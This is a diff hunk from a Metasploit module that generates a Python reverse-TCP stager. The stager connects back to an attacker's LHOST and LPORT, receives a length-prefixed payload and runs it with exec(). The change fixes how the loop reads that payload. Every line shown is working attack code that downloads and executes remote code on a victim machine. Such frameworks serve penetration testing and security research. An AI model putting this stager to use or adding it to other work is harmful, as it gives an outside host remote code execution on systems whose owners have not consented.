@@ -34,9 +34,9 @@ module Metasploit3
     cmd << "s=socket.socket(2,socket.SOCK_STREAM)\n" # socket.AF_INET = 2
     cmd << "s.connect(('#{ datastore['LHOST'] }',#{ datastore['LPORT'] }))\n"
     cmd << "l=struct.unpack('>I',s.recv(4))[0]\n"
-    cmd << "d=s.recv(4096)\n"
-    cmd << "while len(d)!=l:\n"
-    cmd << "\td+=s.recv(4096)\n"
+    cmd << "d=s.recv(l)\n"
+    cmd << "while len(d)<l:\n"
+    cmd << "\td+=s.recv(l-len(d))\n"
     cmd << "exec(d,{'s':s})\n"
 
     # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
